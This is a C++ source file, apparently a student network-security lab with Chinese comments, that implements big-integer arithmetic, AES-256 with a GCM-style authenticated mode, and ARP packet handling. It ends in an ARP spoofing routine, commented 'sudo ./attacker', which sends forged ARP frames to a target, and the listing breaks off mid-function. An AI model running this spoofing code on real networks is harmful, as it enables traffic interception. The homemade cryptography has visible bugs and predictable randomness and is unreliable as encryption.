#include <cstdio>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <pcap.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <cstring>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <unistd.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <netinet/ip.h>   // IP 头部定义
#include <netinet/tcp.h>  // TCP 头部定义
#include <arpa/inet.h>    // inet_ntoa 等函数
#include <libnet.h>


using namespace std;
const int keyLen=512;
struct HEXnum{		//定义大数为0到2的keyLen次方-1 
	bool num[keyLen];
};

bool operator>=(HEXnum x,HEXnum y){	//重载大数大于等于 
	for(int i=keyLen-1;i>=0;i--)
	{
		if(x.num[i]==y.num[i]) continue;
		return x.num[i]>=y.num[i];
	}
	return 1;
}

bool operator==(HEXnum x,HEXnum y){		//重载大数等于 
	for(int i=keyLen-1;i>=0;i--) if(x.num[i]!=y.num[i]) return 0;
	return 1;
}

bool operator>(HEXnum x,HEXnum y){		//重载大数大于 
	for(int i=keyLen-1;i>=0;i--)
	{
		if(x.num[i]==y.num[i]) continue;
		return x.num[i]>y.num[i];
	}
	return 0;
}
HEXnum operator+(HEXnum x,HEXnum y){		//重载大数加 
	HEXnum ret;
	for(int i=0;i<keyLen;i++) ret.num[i]=0;
	for(int i=0;i<keyLen;i++){
		int tmp=x.num[i]+y.num[i]+ret.num[i];
		ret.num[i]=tmp&1;
		if(i<keyLen-1) ret.num[i+1]=tmp&2;
	}
	return ret;
}

HEXnum operator-(HEXnum x,HEXnum y){		//重载大数减
	HEXnum ret;
	for(int i=0;i<keyLen;i++) ret.num[i]=0;	
	for(int i=0;i<keyLen;i++){
		int tmp=x.num[i]-y.num[i]-ret.num[i];
		ret.num[i]=(tmp+2)&1;
		if(i<keyLen-1) ret.num[i+1]=tmp<0;
	}
	return ret;
}

HEXnum operator<<(HEXnum x,int y){		//重载大数左移
	HEXnum ret;
	for(int i=keyLen-1;i>=y;i--) ret.num[i]=x.num[i-y];
	for(int i=y-1;i>=0;i--) ret.num[i]=0;
	return ret;
}

HEXnum operator>>(HEXnum x,int y){		//重载大数右移 
	HEXnum ret;
	for(int i=keyLen-1;i>=keyLen-y;i--) ret.num[i]=0;
	for(int i=keyLen-1-y;i>=0;i--) ret.num[i]=x.num[i+y];
	return ret;
}
unsigned long long prt(HEXnum);
HEXnum operator*(HEXnum x,HEXnum y){		//重载大数乘 
	HEXnum ret;
	for(int i=0;i<keyLen;i++) ret.num[i]=0;
	
	for(int i=0;i<keyLen/2;i++){
		
		if(y.num[i]) ret=ret+x;
		x=x<<1;
	}
	return ret;
}

HEXnum operator%(HEXnum x,HEXnum y){		//重载大数模 
	if(y>x) return x;
	int q=0;
	while(x>=(y<<q)) q++;
	q--;
	while(q>=0){
		if(x>=(y<<q)) x=x-(y<<q);
		q--;
	}
	return x;
}
unsigned long long prt(HEXnum x){		//将大数以10进制输出 
	unsigned long long p=0;
	for(int i=keyLen/2-1;i>=0;i--) p=p*2+x.num[i];
	printf("%llu",p);
	return p;
}
void prtHEX(HEXnum x){		//将大数以16进制输出 
	int cnt=0,m=0;
	bool flg=false;
	for(int i=keyLen/2-1;i>=0;i--)
	{
		cnt++;
		m=m*2+x.num[i];
		if(cnt==4){
			if(!flg&&m) flg=true;
			if(flg) printf("%x",m);
			cnt=m=0;
		}
	}
}
HEXnum stringTo(char *s){		//将16进制字符串转化为大数
	HEXnum ret;
	int len=strlen(s);
	for(int i=0;i<keyLen;i++) ret.num[i]=0;
	for(int i=0;i<len;i++){
		int x=0;
		if(s[i]<='9'&&s[i]>='0') x=s[i]-'0';
		else if(s[i]<='f'&&s[i]>='a') x=s[i]-'a'+10;
		else if(s[i]<='F'&&s[i]>='A') x=s[i]-'A'+10;
		else continue;
		for(int k=0;k<4;k++) ret.num[(len-i-1)*4+k]=(x&(1<<(k)))>0;
	}
	return ret;
}

HEXnum toHEX(unsigned long long p){		//将整数转化为大数 
	HEXnum ret;
	for(int i=keyLen-1;i>=64;i--)	ret.num[i]=0;
	for(int i=63;i>=0;i--) ret.num[i]=(1ull<<i)&p;
	return ret;
}
HEXnum p=toHEX(0);
HEXnum hpow(HEXnum x,HEXnum y){			//大数快速幂 
	HEXnum ret=toHEX(1);	
	while(y>toHEX(0)){
		if(y.num[0]) ret=ret*x%p;
		x=x*x%p;
		y=y>>1;
	}
	return ret;
}
HEXnum randHEX(HEXnum l,HEXnum r){		//生成一个l到r的随机大整数 
	srand(time(0));
	HEXnum del=r-l,ret;
	bool flg=true;
	for(int i=keyLen-1;i>=0;i--){
		if(del.num[i]==0&&flg) {
			ret.num[i]=0;
			continue;
		}
		ret.num[i]=rand()&1;
		if(flg){
			if(ret.num[i]>del.num[i]) ret.num[i]=0;
			else if(ret.num[i]<del.num[i]) flg=false;
		}
	}
	return l+ret;
}
int sendHEX(int client_socket,HEXnum x){		//传送大整数 
	char buffer[keyLen+1];
	for(int i=0;i<keyLen;i++) buffer[i]=x.num[i]+'0';
	buffer[keyLen]='\0';
	return send(client_socket,buffer,keyLen,0);
}
HEXnum recvHEX(int client_socket){		//接收大整数 
	
	char buffer[keyLen+1];
	int r=recv(client_socket,buffer,keyLen,0);
	if(r<=0) printf("error!!\n");
	HEXnum ret;
	for(int i=0;i<keyLen;i++) ret.num[i]=buffer[i]-'0';
	return ret;
}
int Sbox[16][16] = {
        {0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76},
        {0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0},
        {0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15},
        {0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75},
        {0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84},
        {0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf},
        {0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8},
        {0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2},
        {0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73},
        {0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb},
        {0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79},
        {0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08},
        {0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a},
        {0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e},
        {0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf},
        {0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16}
};
int xobS[16][16];
int Pmatrix[4][4]={
	{2,3,1,1},
	{1,2,3,1},
	{1,1,2,3},
	{3,1,1,2},
},w[4][60],pmatrix[4][4]={
	{0xe,0xb,0xd,0x9},
	{0x9,0xe,0xb,0xd},
	{0xd,0x9,0xe,0xb},
	{0xb,0xd,0x9,0xe},
};

int mul(int x,int y){		//8位的伽罗瓦域乘法 
	int ret=0;
	while(x){
		if(x&1) ret^=y;
		y<<=1;
		x>>=1;
	}
	int p=(1<<0)|(1<<1)|(1<<3)|(1<<4)|(1<<8),q=0;
	while((1<<(8+q))<=ret) q++;
	q--;
	while(q>=0) {
		if(ret&(1<<(8+q))) ret^=(p<<q);
		q--;
	}
	return ret;
}
void getW(){	//密钥扩展 
	int rcon[14]={0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36,0x6C,0xD8,0xAB,0x4D};	//轮常量 
	for(int i=8;i<60;i++){
		if((!i%4)&&i%8){	//是四的倍数但是不是八的倍数 
			for(int j=0;j<4;j++) w[j][i]=Sbox[w[j][i-1]>>4][w[j][i-1]&15];	//字节代换
			for(int j=0;j<4;j++) w[j][i]^=w[j][i-8];	//异或i-8 
		}
		if(i%8){	//不是四的倍数也是不是八的倍数 
			for(int j=0;j<4;j++) w[j][i]=w[j][i-1]^w[j][i-8];
		}else{	//是八的倍数 
			for(int j=0;j<4;j++) w[j][i]=w[(j+1)%4][i-1];	//循环左移一位
			for(int j=0;j<4;j++) w[j][i]=Sbox[w[j][i]>>4][w[j][i]&15];	//字节代换 
			w[0][i]^=rcon[i/4-1];	//轮常量异或 
			for(int j=0;j<4;j++) w[j][i]^=w[j][i-8];	//异或i-8 
		}
	} 
}

void subBytes(int ciphertext[4][4]){	//字节替换
	for(int i=0;i<4;i++) for(int j=0;j<4;j++)
	ciphertext[i][j]=Sbox[ciphertext[i][j]>>4][ciphertext[i][j]&15];
}

void subBytes_inverse(int ciphertext[4][4]){	//逆字节替换
	for(int i=0;i<4;i++) for(int j=0;j<4;j++)
	ciphertext[i][j]=xobS[ciphertext[i][j]>>4][ciphertext[i][j]&15];
}

void shiftRows(int ciphertext[4][4]){	//行移位
	for(int i=1;i<4;i++) {
		int tmp[4];
		for(int j=0;j<4;j++) tmp[j]=ciphertext[i][j];
		for(int j=0;j<4;j++)
			ciphertext[i][j]=tmp[(j+i+4)%4];	
	}
	
}

void shiftRows_inverse(int ciphertext[4][4]){	//逆行移位
	for(int i=1;i<4;i++) {
		int tmp[4];
		for(int j=0;j<4;j++) tmp[j]=ciphertext[i][j];
		for(int j=0;j<4;j++)
			ciphertext[i][j]=tmp[(j-i+4)%4];	
	}
	
}
void mixColumns(int ciphertext[4][4]){	//列混合
	int tmp[4][4];
	for(int i=0;i<4;i++) for(int j=0;j<4;j++) tmp[i][j]=ciphertext[i][j];
	for(int i=0;i<4;i++) for(int j=0;j<4;j++){
		ciphertext[i][j]=0;
		for(int k=0;k<4;k++) ciphertext[i][j]^=mul(Pmatrix[i][k],tmp[k][j]);
	}
}

void mixColumns_inverse(int ciphertext[4][4]){	//逆列混合
	int tmp[4][4];
	for(int i=0;i<4;i++) for(int j=0;j<4;j++) tmp[i][j]=ciphertext[i][j];
	for(int i=0;i<4;i++) for(int j=0;j<4;j++){
		ciphertext[i][j]=0;
		for(int k=0;k<4;k++) ciphertext[i][j]^=mul(pmatrix[i][k],tmp[k][j]);
	}
}

void addRoundKey(int ciphertext[4][4],int x){	//（逆）轮密钥加 
	for(int i=0;i<4;i++) for(int j=0;j<4;j++) ciphertext[i][j]^=w[i][j+x*4];
}

void prt(int ciphertext[4][4]){ 	//将数组打印为01串 
	for(int i=0;i<4;i++)
	{
		for(int j=0;j<4;j++) printf("%X ",ciphertext[i][j]);
		printf("\n"); 
	}
	int tmp[128],tot=0;
	for(int i=0;i<4;i++)for(int j=0;j<4;j++)
		for(int k=1;k<=(1<<7);k<<=1)
			if(ciphertext[i][j]&k)
			{
				putchar('1');
				tmp[tot++]=1;
			}
			else
			{
				putchar('0');
				tmp[tot++]=0;
			}
	printf("\n"); 
}


string AES_inverse(char *s,HEXnum c){
	int ciphertext[4][4];
	for(int i=0;i<4;i++)for(int j=0;j<4;j++){
		
		int num1=s[(j+i*4)*2],num2=s[(j+i*4)*2+1];
		if(num1>='0'&&num1<='9') num1-='0';
		else num1-='A'-10;
		if(num2>='0'&&num2<='9') num2-='0';
		else num2-='A'-10;
		ciphertext[j][i]=num1*16+num2;
	}
		
	for(int i=0;i<8;i++) for(int j=0;j<4;j++)
	{
		w[j][i]=0;
		for(int k=0;k<8;k++) w[j][i]=w[j][i]*2+c.num[(i*4+j)*8+k];	
	}
	getW();
	addRoundKey(ciphertext,14);	
	shiftRows_inverse(ciphertext);
	subBytes_inverse(ciphertext);
	for(int i=13;i>0;i--){
		addRoundKey(ciphertext,i);
		mixColumns_inverse(ciphertext);
		shiftRows_inverse(ciphertext);
		subBytes_inverse(ciphertext);
	}
	string ret="";
	for(int i=0;i<4;i++)for(int j=0;j<4;j++) {
		ciphertext[j][i]^=w[j][i];
		ret+=(char) ciphertext[j][i];
	}
	
	return ret;
}

string AES(char *s,HEXnum c){
	int ciphertext[4][4];
	//初始变换 
	for(int i=0;i<8;i++) for(int j=0;j<4;j++)
	{
		w[j][i]=0;
		for(int k=0;k<8;k++) w[j][i]=w[j][i]*2+c.num[(i*4+j)*8+k];	
	}
	int len=strlen(s);
	for(int i=0;i<4;i++) for(int j=0;j<4;j++){
		if(i*4+j<len)  ciphertext[j][i]=s[i*4+j]^w[j][i];
		else ciphertext[j][i]=w[j][i];
	}
	
	getW();
	for(int i=1;i<=13;i++){
		subBytes(ciphertext);
		shiftRows(ciphertext);
		mixColumns(ciphertext);
		addRoundKey(ciphertext,i);
	}
	subBytes(ciphertext);
	shiftRows(ciphertext);
	addRoundKey(ciphertext,14);
	
	string ret="";
	for(int i=0;i<4;i++) for(int j=0;j<4;j++){
		int num=ciphertext[j][i]/16;
		if(num<10) ret+=(char)(num+'0');
		else ret+=(char)(num+'A'-10);
		num=ciphertext[j][i]%16;
		if(num<10) ret+=(char)(num+'0');
		else ret+=(char)(num+'A'-10);
	}
	return ret;
}

void AES256(int ciphertext[4][4],HEXnum c){		//AES算法 
	 
	for(int i=0;i<8;i++) for(int j=0;j<4;j++)
	{
		w[j][i]=0;
		for(int k=0;k<8;k++) w[j][i]=w[j][i]*2+c.num[(i*4+j)*8+k];	
	}
	
	//初始变换
	for(int i=0;i<4;i++) for(int j=0;j<4;j++) ciphertext[j][i]^=w[j][i];
	
	getW();
	for(int i=1;i<=13;i++){		//前13轮 
		subBytes(ciphertext);
		shiftRows(ciphertext);
		mixColumns(ciphertext);
		addRoundKey(ciphertext,i);
	}
	subBytes(ciphertext);		//最后一轮不进行列混合 
	shiftRows(ciphertext);
	addRoundKey(ciphertext,14);

}
string numToString(int ciphertext[4][4]){		//将数组转化为16进制字符串 
	string ret="";
	for(int i=0;i<4;i++) for(int j=0;j<4;j++){
		int num=ciphertext[j][i]/16;
		if(num<10) ret+=(char)(num+'0');
		else ret+=(char)(num+'A'-10);
		num=ciphertext[j][i]%16;
		if(num<10) ret+=(char)(num+'0');
		else ret+=(char)(num+'A'-10);
	}
	return ret;
}

void stringToNum(int ciphertext[4][4],char *s){		//将一般的字符串转化为数组 
	for(int i=0;i<4;i++) for(int j=0;j<4;j++){
		if(i*4+j<strlen(s)) ciphertext[j][i]=s[i*4+j];
		else ciphertext[j][i]=0;
	}	
}

void hexToNum (int ciphertext[4][4],char *s){		//将16进制字符串转化为数组 
	for(int i=0;i<4;i++) for(int j=0;j<4;j++){
		int num=s[(i*4+j)*2];
		if(num<='9'&&num>='0') ciphertext[j][i]=(num-'0')*16;
		else if(num<='f'&&num>='a') ciphertext[j][i]=(num-'a'+10)*16;
		else if(num<='F'&&num>='A') ciphertext[j][i]=(num-'A'+10)*16;
		
		num=s[(i*4+j)*2+1];
		if(num<='9'&&num>='0') ciphertext[j][i]+=num-'0';
		else if(num<='f'&&num>='a') ciphertext[j][i]+=num-'a'+10;
		else if(num<='F'&&num>='A') ciphertext[j][i]+=num-'A'+10;
		
	}
	
}
void galois128(int ciphertext[4][4],int key[4][4]){		//128位伽罗瓦域乘法 
	bool num1[128],num2[128],tmp[256];
	for(int i=0;i<4;i++) for(int j=0;j<4;j++) for(int k=0;k<8;k++){
		num1[(i*4+j)*8+k]=ciphertext[j][i]&(1<<k);
		num2[(i*4+j)*8+k]=key[j][i]&(1<<k);
		tmp[(i*4+j)*8+k]=tmp[(i*4+j)*8+k+128]=0;
	}
	for(int i=0;i<128;i++) {		//异或乘法 
		if(!num2[i]) continue;
		for(int j=0;j<128;j++) tmp[i+j]^=num1[j];	
	}
	int idx[6]={128,7,2,1,0};		//异或取余 
	for(int i=255-128;i>=0;i--)
		if(tmp[i+128])
			for(int j=0;j<5;j++)
				tmp[i+idx[j]]^=1;
			
	for(int i=0;i<4;i++) for(int j=0;j<4;j++)	{
		int num=0;
		for(int k=0;k<8;k++) num=num*2+tmp[(i*4+j)*8+k];
		ciphertext[j][i]=num;
	}
}

string encoding(char *s,HEXnum c){		//编码 
	//初始化CTR 
	int ctr[4][4],h[4][4],mac[4][4];
	for(int i=0;i<4;i++) for(int j=0;j<4;j++)
	{
		ctr[j][i]=h[j][i]=mac[j][i]=0;
		for(int k=0;k<8;k++)
			if(rand()&1){
				ctr[j][i]|=(1<<k);
				h[j][i]|=(1<<k);
				mac[j][i]|=(1<<k);
			}
				
	}
	

	AES256(h,c);	//h为校验密钥 
	galois128(mac,h);
	
	string ret=numToString(ctr);		//将CTR加入密文首部 
	
	int cnt=0;
	for(int i=0;i<=strlen(s);i+=16){
		cnt++;
		int ctri[4][4];
		for(int i=0;i<4;i++) for(int j=0;j<4;j++) ctri[j][i]=ctr[j][i];
		ctri[0][0]+=cnt;
		
		for(int i=0;i<16;i++) {		//初始化CTR+i 
			if(ctr[i%16][i/16]<256) break;
			if(i<15) ctr[(i+1)%16][(i+1)/16]+=ctr[i%16][i/16]/256;
			ctr[i%16][i/16]%=256;
		}
		
		AES256(ctri,c);		//分组进行AES加密 
		
		int plain[4][4];
		stringToNum(plain,s+i);
		for(int i=0;i<4;i++) for(int j=0;j<4;j++)
		{
			plain[j][i]^=ctri[j][i];
			mac[j][i]^=plain[j][i];
		}
		galois128(mac,h);
		ret+=numToString(plain);
	}
	for(int i=0;i<4;i++) for(int j=0;j<4;j++) mac[j][i]^=h[j][i];
	ret+=numToString(mac);		//将MAC加入密文尾部  
	return ret;
}

string decoding(char *s,HEXnum c){		//解码 
	int ctr[4][4],h[4][4],mac[4][4];
	if(strlen(s)%32||strlen(s)<=64) return "";
	for(int i=0;i<4;i++) for(int j=0;j<4;j++){	//取出首部CTR进行初始化
		int num=s[(i*4+j)*2];
		if(num<='9'&&num>='0') ctr[j][i]=h[j][i]=mac[j][i]=(num-'0')*16;
		else if(num<='f'&&num>='a') ctr[j][i]=h[j][i]=mac[j][i]=(num-'a'+10)*16;
		else if(num<='F'&&num>='A') ctr[j][i]=h[j][i]=mac[j][i]=(num-'A'+10)*16;
		
		num=s[(i*4+j)*2+1];
		if(num<='9'&&num>='0') ctr[j][i]=h[j][i]=mac[j][i]=ctr[j][i]+num-'0';
		else if(num<='f'&&num>='a') ctr[j][i]=h[j][i]=mac[j][i]=ctr[j][i]+num-'a'+10;
		else if(num<='F'&&num>='A') ctr[j][i]=h[j][i]=mac[j][i]=ctr[j][i]+num-'A'+10;
		
	}
	AES256(h,c);	//h为校验密钥 
	galois128(mac,h);
	
	int cnt=0;
	string ret="";
	for(int i=32;i<strlen(s)-32;i+=32){		//分块进行解密 
		cnt++;
		int ctri[4][4];
		for(int i=0;i<4;i++) for(int j=0;j<4;j++) ctri[j][i]=ctr[j][i];
		ctri[0][0]+=cnt;
		
		for(int i=0;i<16;i++) {		//初始化CTR+i
			if(ctr[i%16][i/16]<256) break;	
			if(i<15) ctr[(i+1)%16][(i+1)/16]+=ctr[i%16][i/16]/256;
			ctr[i%16][i/16]%=256;
		}

		AES256(ctri,c);
		int plain[4][4];
		hexToNum(plain,s+i);
		
		for(int i=0;i<4;i++) for(int j=0;j<4;j++)
		{
			mac[j][i]^=plain[j][i];
			plain[j][i]^=ctri[j][i];
			ret+=(char)plain[j][i];
		}
		galois128(mac,h);
		
	}
	for(int i=0;i<4;i++) for(int j=0;j<4;j++) mac[j][i]^=h[j][i];
	int mac_[4][4];
	hexToNum(mac_,s+strlen(s)-32);		//取出尾部MAC进行消息验证 
	for(int i=0;i<4;i++) for(int j=0;j<4;j++)	
		if(mac[j][i]!=mac_[j][i])
			return "";	//返回空表示消息被篡改 
	return ret;
	
}

// 链路层数据包格式
typedef struct {
    u_char DestMac[6];
    u_char SrcMac[6];
    u_char Etype[2];
} ETHHEADER;

// IP层数据包格式
typedef struct {
    int header_len:4;
    int version:4;
    u_char tos:8;
    int total_len:16;
    int ident:16;
    int flags:16;
    u_char ttl:8;
    u_char proto:8;
    int checksum:16;
    u_char sourceIP[4];
    u_char destIP[4];
} IPHEADER;

// 协议映射表
char *Proto[]={
    "Reserved","ICMP","IGMP","GGP","IP","ST","TCP"
};

//获取本机MAC地址，存入mac数组中，要求传入网卡名字
int getMacAddr(unsigned char mac[], const char name[])
{
    struct ifreq ethinfo;
    int sock_fd;
    if (name == NULL || mac == NULL) {
        return -1;
    }

    if ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Open Socket");
        return -1;
    }

    strcpy(ethinfo.ifr_name, name);

    if (ioctl(sock_fd, SIOCGIFHWADDR, &ethinfo) < 0) {
        perror("Ioctl");
        return -1;
    }
    
    for (int i = 0; i < 6; ++i) {
        mac[i] = (unsigned char)ethinfo.ifr_hwaddr.sa_data[i];
    }

    close(sock_fd);

    return 1;
}

//构建ARP数据包
void packarp(unsigned char *mymac, unsigned char *tarmac, unsigned int *tarip, unsigned int *myip, unsigned char *opcode, unsigned char *arppack) {
    // ARP 的固定部分
    unsigned char eth_type[2] = {0x00, 0x01};   // 硬件类型，以太网为 1
    unsigned char por_type[2] = {0x08, 0x00};    // ARP 协议类型，IP 协议为 0x0800
    unsigned char arp_type[2] = {0x08, 0x06};    // ARP 帧类型，0x0806 表示 ARP
    unsigned char eth_length = 6;                 // 硬件地址长度（MAC 地址的字节数）
    unsigned char por_length = 4;                 // 协议地址长度（IP 地址的字节数）

    // 清空 ARP 包缓存
    memset(arppack, 0, 42); 

    // ARP 包填充顺序
    memcpy(arppack, tarmac, 6);           // 目标 MAC 地址
    memcpy(arppack + 6, mymac, 6);        // 源 MAC 地址
    memcpy(arppack + 12, arp_type, 2);    // ARP 类型（0x0806）
    memcpy(arppack + 14, eth_type, 2);    // 硬件类型（0x0001，以太网）
    memcpy(arppack + 16, por_type, 2);    // 协议类型（0x0800，表示 IP 协议）
    memcpy(arppack + 18, &eth_length, 1); // 硬件地址长度（6）
    memcpy(arppack + 19, &por_length, 1); // 协议地址长度（4）
    memcpy(arppack + 20, opcode, 2);      // 操作码（0x0001: 请求；0x0002: 响应）
    
    // 发送者 MAC 地址和 IP 地址
    memcpy(arppack + 22, mymac, 6);          // 发送者 MAC 地址
    memcpy(arppack + 28, myip, 4);           // 发送者 IP 地址
    memcpy(arppack + 32, tarmac, 6);    	 // 目标 MAC 地址
    memcpy(arppack + 38, tarip, 4);          // 目标 IP 地址
}
// ARP 数据包结构
void parse_arp_packet(unsigned char *packet) {
    // ARP 数据包格式
    // (硬件类型、协议类型、硬件地址长度、协议地址长度、操作码、发送者MAC、发送者IP、目标MAC、目标IP)
    
    // 提取操作码（第 20 和 21 字节）
    unsigned short opcode = (packet[20] << 8) | packet[21];  // 操作码（16 位）

    // 获取源 MAC 地址（第 22 到 27 字节）
    unsigned char *sender_mac = (unsigned char *)(packet + 22);

    // 获取源 IP 地址（第 28 到 31 字节）
    unsigned int sender_ip = (packet[28] << 24) | (packet[29] << 16) | (packet[30] << 8) | packet[31];

    // 获取目标 MAC 地址（第 32 到 37 字节）
    unsigned char *target_mac = (unsigned char *)(packet + 32);

    // 获取目标 IP 地址（第 38 到 41 字节）
    unsigned int target_ip = (packet[38] << 24) | (packet[39] << 16) | (packet[40] << 8) | packet[41];

    // 打印包内容
    printf("ARP 操作码: 0x%04x\n", opcode);
    printf("源 MAC 地址: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           sender_mac[0], sender_mac[1], sender_mac[2], 
           sender_mac[3], sender_mac[4], sender_mac[5]);
    printf("源 IP 地址: %d.%d.%d.%d\n", 
           (sender_ip >> 24) & 0xFF, (sender_ip >> 16) & 0xFF, 
           (sender_ip >> 8) & 0xFF, sender_ip & 0xFF);
    printf("目标 MAC 地址: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           target_mac[0], target_mac[1], target_mac[2], 
           target_mac[3], target_mac[4], target_mac[5]);
    printf("目标 IP 地址: %d.%d.%d.%d\n", 
           (target_ip >> 24) & 0xFF, (target_ip >> 16) & 0xFF, 
           (target_ip >> 8) & 0xFF, target_ip & 0xFF);

    // 判断操作码
    if (opcode == 0x0001) {
        printf("这是一个 ARP 请求包\n");
    } else if (opcode == 0x0002) {
        printf("这是一个 ARP 响应包\n");
    } else {
        printf("未知的 ARP 操作码: 0x%04x\n", opcode);
    }
}
bool getMac(char dev[],char srcip[],char dstip[],unsigned char mac[]){
	unsigned char mymac[6] = {0};
    unsigned char tarmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    unsigned char recvarp[42] = {0};
    unsigned char sendarp[42] = {0};
    unsigned int tarip;
    unsigned int myip;
    unsigned char opcode[2];
    int sock_fd;
    struct sockaddr addr;


    //获取本机MAC地址
    if (getMacAddr(mymac, dev) < 0) {
        printf("获取MAC地址失败\n");
        return EXIT_FAILURE;
    }
    
    myip = inet_addr(srcip);
    tarip = inet_addr(dstip);
    opcode[0] = 0x00;
    opcode[1] = 0x01;

    //进行ARP数据打包，用于获取接收方mac地址
    packarp(mymac, tarmac, &tarip, &myip, opcode, sendarp);
	
    //准备socket通讯
    if ((sock_fd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP))) < 0) {
        perror("Open Socket");
        return EXIT_FAILURE;
    }

    memset(&addr, 0, sizeof(addr));
    strncpy(addr.sa_data, dev, sizeof(addr.sa_data));
    socklen_t len = sizeof(addr);

    //获取接收方mac地址
	printf("正在获取目标MAC地址...\n");
    while(1) {
        if (sendto(sock_fd, sendarp, 42, 0, &addr, len) == 42) {
			putchar('>');
        } else {
            perror("sendto");
            return EXIT_FAILURE;
        }
		
        // sudo ./attacker
        if (recvfrom(sock_fd, recvarp, 42, 0, &addr, &len) == 42) {
            if (!memcmp((void *)recvarp + 32, (void *)sendarp + 22, 4)) {
                memcpy(tarmac, recvarp + 22, 6);
				memcpy(mac, recvarp + 22, 6);
                printf("\n获取目标MAC地址:");
				printf(" %02x:%02x:%02x:%02x:%02x:%02x成功\n", 
				recvarp[22], recvarp[23], recvarp[24], 
				recvarp[25], recvarp[26], recvarp[27]);
                break;
            }
        }
        
        sleep(1);
    }
	return 1;
}
bool arp(char dev[],char srcip[],char dstip[]){
    unsigned char mymac[6] = {0};
    unsigned char tarmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    unsigned char recvarp[42] = {0};
    unsigned char sendarp[42] = {0};
    unsigned int tarip;
    unsigned int myip;
    unsigned char opcode[2];
    int sock_fd;
    struct sockaddr addr;


    //获取本机MAC地址
    if (getMacAddr(mymac, dev) < 0) {
        printf("获取MAC地址失败\n");
        return EXIT_FAILURE;
    }
    
    myip = inet_addr(srcip);
    tarip = inet_addr(dstip);
    opcode[0] = 0x00;
    opcode[1] = 0x01;

    //进行ARP数据打包，用于获取接收方mac地址
    packarp(mymac, tarmac, &tarip, &myip, opcode, sendarp);
	
    //准备socket通讯
    if ((sock_fd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP))) < 0) {
        perror("Open Socket");
        return EXIT_FAILURE;
    }

    memset(&addr, 0, sizeof(addr));
    strncpy(addr.sa_data, dev, sizeof(addr.sa_data));
    socklen_t len = sizeof(addr);

    //获取接收方mac地址
	printf("正在获取目标MAC地址...\n");
    while(1) {
        if (sendto(sock_fd, sendarp, 42, 0, &addr, len) == 42) {
			putchar('>');
        } else {
            perror("sendto");
            return EXIT_FAILURE;
        }
		
        // sudo ./attacker
        if (recvfrom(sock_fd, recvarp, 42, 0, &addr, &len) == 42) {
            if (!memcmp((void *)recvarp + 32, (void *)sendarp + 22, 4)) {
                memcpy(tarmac, recvarp + 22, 6);
                printf("\n获取目标MAC地址:");
				printf(" %02x:%02x:%02x:%02x:%02x:%02x成功\n", 
				recvarp[22], recvarp[23], recvarp[24], 
				recvarp[25], recvarp[26], recvarp[27]);
                break;
            }
        }
        
        sleep(1);
    }
    //进行ARP数据打包，用于进行ARP欺骗
    opcode[0] = 0x00;
    opcode[1] = 0x01;
    packarp(mymac, tarmac, &tarip, &myip, opcode, sendarp);
	printf("正在进行ARP欺骗...\n");
    for(int i=1;i<=5;i++) {
        if (sendto(sock_fd, sendarp, 42, 0, &addr, len) == 42) {
            putchar('>');
        } else {
            perror("sendto");
            return EXIT_FAILURE;
        }
        sleep(1);
    }
